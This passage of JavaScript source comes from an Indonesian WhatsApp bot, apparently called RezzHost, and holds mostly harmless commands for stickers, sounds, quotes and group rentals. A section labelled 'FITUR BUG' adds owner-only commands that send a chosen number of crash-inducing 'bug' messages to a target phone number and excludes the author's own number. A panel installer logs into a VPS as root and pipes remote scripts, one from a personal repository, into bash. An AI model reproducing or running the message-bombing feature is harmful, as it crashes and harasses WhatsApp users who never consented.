                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'rezz': 
case 'rez':
case 'rerez':
case 'rerezz': {
RezzHost.sendMessage(m.chat, {sticker: fs.readFileSync('./media/bejir.webp')}, {quoted: m})
}
break
case '@6281288031294': {
m.reply('Nani !');
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161': 
case 'sound162':
case 'sound163':
case 'sound164':
case 'sound165':
case 'sound166':
case 'sound167':
case 'sound168':
case 'sound169':
case 'sound170':{
let link = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
await RezzHost.sendMessage(m.chat, {audio : {url : link }, mimetype:'audio/mpeg'}, {quoted:m})
}
break
case 'delsampah':{
if (!isCreator) return reply2(`Lancang Sekali anda`)
let directoryPath = path.join('./')
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return reply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
reply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./${file}`)
});
await delay(2000)
reply("Berhasil menghapus semua sampah")
});
}
break
 case 'kalkulator':{
val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
RezzHost.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
let result = (new Function('return ' + val))()
if (!result) return m.reply(result)
m.reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return m.reply('Isinya?')
m.reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}
break
case 'ceksn':
const hy = createSerial(20) 
m.reply(`SN : ${hy}`)
break
case 'sweet-candy':
case 'illuminated-metallic':
case 'carved-wood':
case 'night-sky':
case 'butterfly':
case 'coffee-cup':
case 'picture-of-love':
case 'flower-typography':
case 'harry-potter':
case 'under-grass':
case 'metallic':
case 'shadow-sky':
case 'flaming':{
if (!text) return m.reply(`Ex: ${prefix + command} Rerez Hosting`)
RezzHost.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
RezzHost.sendMessage(m.chat,{image: {url: `https://dsgner.vercel.app/api/photooxy/${command}?text=${text}`}, caption: global.mess.success },{quoted:m})
}
break;

case 'textkosong':
case 'tekskosong': {
m.reply('‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ');
}
break

case 'addsewa':
await loading()
if (!isCreator) return reply2(`Lancang Sekali anda`)
if (text < 2) return warning(`Gunakan dengan cara ${prefix+command} *linkgc waktu*\n\nContoh : ${prefix+command} https://chat.whatsapp.com 30d`)
if (!isUrl(args[0])) return warning(mess.error.Iv)
var url = args[0]
addCountCmd('addsewa', m.sender, _cmd)
url = url.split('https://chat.whatsapp.com/')[1]
if (!text) return warning(`Waktunya?`)
var data = await RezzHost.groupAcceptInvite(url)
if (_sewa.checkSewaGroup(data, sewa)) return warning(`Bot sudah disewa oleh grup tersebut!`)
_sewa.addSewaGroup(data, args[1], sewa)
m.reply(`Success Add Sewa Group Berwaktu!`)
break
case 'delsewa':
await loading()
if (!isCreator) return reply2(`Lancang Sekali anda`)
if (!m.isGroup) return warning(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
if (!isSewa) return warning(`Bot tidak disewa di Grup ini`)
addCountCmd('delsewa', m.sender, _cmd)
sewa.splice(_sewa.getSewaPosition(args[0] ? args[0] : m.chat, sewa), 1)
fs.writeFileSync('./lib/sewa.json', JSON.stringify(sewa, null, 2))
m.reply(`Sukses`)
break
case 'cekkhodam':
case 'cekhodam': {
if (!q) return reply("ketik nama lu anjg")
  
	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	  "Siluman Tobrut",
	  "Tobrut Ireng",
	])
  
	const response = `
╾─────╼[ CEK KHODAM]╾─────╼

♙ *Nama :* ${text}
♗ *Khodam :* ${khodam}
╾───────────────────────╼
	  `
	m.reply(response)
  }
break
case 'galau': case 'katakatagalau': {
const galau = pickRandom([
  'Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji',
  'Rasanya baru kemarin kamu menawariku seblak. Lalu entah mengapa hari ini menanyakan kabar pun tidak.\n~vinaa',
  "What's the point of us being close yesterday?\n~Vinaa",
  'Kamu tidak bisa memaksa seseorang untuk menomor satukan dirimu, sebab prioritas dengan kebutuhan itu jelas beda.\n*BY PUTRI*',
  'Hubungan kita hanya sampai dilisan, tidak sampai dipertemukan.\n*BY PUTRI*',
  'Dia sesuka hati, kamu setulus hati.\n*BY PUTRI*',
  'Mengakhiri bukan berarti tidak mau berjuang lagi...hanya saja aku tidak mau ada lgi,hati yg tersakiti.\n\nBy putri',
  'Maaf. Tidak ada waktu untuk meladeni gabutmu. Karena aku sibuk dengan kesibukan ku.\n*BY PUTRI*',
  'Pelangimu mungkin banyak warna. Tapi, tak ada warna yang membuat dia menaruh rasa.\n*BY PUTRI*',
  'Bahagia terus ya,sampai saat ini lu masih jadi tokoh favorit dikisah hidup gue,luv u.\n*BY PUTRI*',
  'Sorry,gue ga kuat buat semuanya ,mksi ya\n\n*BY PUTRI*',
  'Kamu memang sosok yg tak terduga Mudah membuat ku bahagia,mudah membuatku hancur saat itu juga.\n*BY PUTRI*',
  'Harusnya kalo udah ga sayang sama aku tu bilang aja gausa di tutup tutupin\n*BY INDI*',
  'Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu',
  'Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu',
  'Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu',
  'Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu',
  'Tak semudah itu melupakanmu',
  'Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya',
  'Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya',
  'Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya',
  'Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama',
  'Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya',
  'Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku',
  'Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati',
  'Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya',
  'Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu',
  'Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat',
  'Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya',
  'Tolong jangan pergi saat aku sudah sangat sayang padamu',
  'Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget',
  'Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu',
  'Sakit itu ketika cinta yang aku beri tidak kamu hargai',
  'Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu',
  'Karenamu aku jadi tau cinta yang sesungguhnya',
  'Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih',
  'Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai',
  'Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa',
  'Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis',
  'Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa',
  'Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama',
  'Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan',
  'Aku tak menyangka kamu pergi dan melupakan ku begitu cepat',
  'Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa',
  'Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku',
  'Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia',
  'Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali',
  'Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu',
  'Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu',
  'Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri',
  'Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku',
  'Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka',
  'Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu',
  'Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan',
  'Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina',
  'Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri',
  'Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja',
  'Aku berdiri disini sendiri menunggu kehadiran dirimu',
  'Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran',
  'Maaf aku lupa ternyata aku bukan siapa-siapa',
  'Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu',
  'Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku',
  'Jangan buat aku terlalu berharap jika kamu tidak menginginkanku',
  'Lebih baik sendiri daripada berdua tapi tanpa kepastian',
  'Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri',
  'Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar',
  'Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi',
  'Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki',
  'Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu',
  'Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau',
  'Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa',
  'Aku bukan mencari yang sempurna tapi yang terbaik untukku',
  'Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan',
  'Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka',
  'Terima kasih karena kamu aku menjadi lupa tentang masa laluku',
  'Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja',
  'Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati',
  'Mikirin orang yang gak pernah mikirin kita itu emang bikin gila',
  'Dari sekian lama menunggu apa yang sudah didapat',
  'Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali',
  'Yang sendiri adalah yang bersabar menunggu pasangan sejatinya',
  'Aku terlahir sederhana dan ditinggal sudah biasa',
  'Aku sayang kamu tapi aku masih takut untuk mencintaimu',
  'Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia',
  'Aku tidak pernah berpikir kamu akan menjadi yang sementara',
  'Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah',
  'Jangan paksa aku menjadi cewek seperti seleramu',
  'Hanya yang sabar yang mampu melewati semua kekecewaan',
  'Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri',
  'Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu',
  'Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu',
  'Punya kalimat sendiri & mau ditambahin? chat *.owner*'
])
  
const response = `${galau}`
m.reply(response)
await RezzHost.sendMessage(from, {audio: fs.readFileSync(`./media/galau.mp3`), mimetype: 'audio/mp4' }, { quoted: m })
}
break
case 'intro': 
case 'kartuintro':{
m.reply(`⋆ ˚｡⋆୨୧˚іᥒ𝗍r᥆˚୨୧⋆｡˚ ⋆

|ղαოα ^-^°:
|մოմɾ ^-^°:
|αskօԵ ^-^°:
|ցҽղժҽɾ ^-^°:
|sԵαԵմs ^-^°:

{sᥱm᥆gᥲ ᑲᥱ𝗍ᥲһ ᥡᥲᥕᥕ}`);
}
break

//==================[ FITUR BUG ]===============//
case 'x-sui': 
case 'rezz-sui': {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`
Contoh : ${prefix+command} Number\nExample ${prefix+command} 628xxxxxxxxx`) 
let number = text.split(',')[0];
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
let tekss = `*SILAHKAN PILIH JUMLAH BUG YANG INGIN ANDA KIRIM !*
`
let sections = [
{
title: '<!> BUG SYSTEM UI <!>', 
highlight_label: 'Recomended',
rows: [{
title: 'SEND 5 BUG',
description: `SEND 5 BUG TO ${number}`, 
id: `.x-sysui ${number},5`
}, {
title: 'SEND 7 BUG', 
description: `SEND 7 BUG TO ${number}`, 
id: `.x-sysui ${number},7`
}, {
title: 'SEND 10 BUG', 
description: `SEND 10 BUG TO ${number}`, 
id: `.x-sysui ${number},10`
}, {
title: 'SEND 15 BUG', 
description: `SEND 15 BUG TO ${number}`, 
id: `.x-sysui ${number},15`
}, {
title: 'SEND 20 BUG', 
description: `SEND 20 BUG TO ${number}`, 
id: `.x-sysui ${number},20`
}, {
title: 'SEND 25 BUG', 
description: `SEND 25 BUG TO ${number}`, 
id: `.x-sysui ${number},25`
}, {
title: 'SEND 30 BUG', 
description: `SEND 30 BUG TO ${number}`, 
id: `.x-sysui ${number},30`
}]},
]
let listMessage = {
    title: '<!> BUG SYSTEM UI <!>', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: wm,
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: tekss
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles(`simple whatsapp bot made by ${ownername}`)
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hello, @${m.sender.replace(/@.+/g, '')}!*`,
 subtitle: wm,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: fs.readFileSync('./media/menu.mp4'), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP OFFC","url":"${global.gr}","merchant_url":"https://www.google.com"}`
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'sytemuicrash': case 'x-sysui':{
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`
Contoh : ${prefix+command} Number,jumlah\nExample ${prefix+command} 628xxxxxxxxx,5`) 
let number = text.split(',')[0];
let amount = text.split(',')[1] * 5;
if (!number || !amount) {
return rm.eply(`Contoh : ${prefix+command} Number,Jumlah\nExample ${prefix+command} 628xxxxxxxxx,5`) 
}
if (isNaN(parseInt(amount))) {
return replygcxeon("Amount must be a number");
}
let cleanedNumber = number.replace(/[^0-9]/g, '');
let encodedAmount = '' + encodeURI(amount);
var contactInfo = await RezzHost.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
if (cleanedNumber == "6283841605780") {
return;
}
if (contactInfo.length == 0) {
return m.reply("Number Tidak Terdaftar Di WhatsApp !!!\nAtau Awali Dengan Kode Negara");
}
m.reply("please wait, " + command + " bug is in process..");
await sleep(2000);
sendMixedMessages(whatsappNumber, encodedAmount);
await sleep(2500);
sendMessageWithMentions(
"Sukses Mengirim Bug Ke @" + whatsappNumber.split('@')[0] + 
" Dengan *" + command + "* ✅\n\nHarap Jangan Chat Target Dengan Nomor Yang Di Gunakan Untuk Mengirim Bug !!!", 
[whatsappNumber]
);
}
break


case 'installpanelv2': case 'installvps': case 'installpanel': { 
    if (!isCreator) return ('Maaf Hanya Untuk Owner');
    let t = text.split(',');
    if (t.length < 4) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}installpanelv2 ipvps,password,domainpnl,domainnode,ramvps(Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const node = 'bash <(curl https://raw.githubusercontent.com/Awafff/RerezzOfficial/main/install.sh)'
    const conn = new Client();

    conn.on('ready', () => {
        m.reply('*PROSES PENGINSTALLAN PANEL SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                if (data.toString().includes('Input')) {
                    stream.write('0\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('adm\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('Asia/Jakarta\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('adm@gmail.com\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('adm@gmail.com\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('adm\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('adm\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('adm\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write(`${password}\n`);
                }
                if (data.toString().includes('Input')) {
                    stream.write(`${subdomain}\n`);
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('yes\n');
                }
                if (data.toString().includes('Please read the Terms of Service')) {
                    stream.write('Y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('1\n');
                }
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);
    
    async function installWings(conn, domainnode, subdomain, password) {
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                if (data.toString().includes('Input')) {
                    stream.write('1\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write(`${subdomain}\n`);
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('adm\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('adm\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write(`${domainnode}\n`);
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('adm@gmail.com\n');
                }
                if (data.toString().includes('Input')) {
                    stream.write('y\n');
                }
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }
        
       function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write('Rerezz\n');
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('AutoCnode Rezzz\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
    
async function sendPanelData(subdomain, password) {
let txt = `*[ DATA PANEL ANDA ]*

*USERNAME:* adm
*PASSWORD:* ${password}
*LINK LOGIN:* ${subdomain}

*SILAHKAN CREAT TOKEN ANDA DAN INSTALL TOKEN DENGAN CARA KETIK [ .startwings ipvps,password vps,token ]*
*LANGKAH LANGKAH :*
1. Login Ke Panel
2. Masuk Ke Bagian Admin
3. Masuk Ke Menu Alocation
4. Creat Alocation
5. Masuk Ke Menu Node
6. Creat Node
7. Masuk Ke Configuration
8. Ketik Get Token Dan Salin
7. Instal Token Di Bot 
*Contoh :* startwings ${ipvps},${passwd},Isi Token Node
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: wm, 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: idsal,
 newsletterName: wm, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: txt
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `D A T A - P A N E L`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: wm,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"adm\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
},
{
"name": "cta_copy",
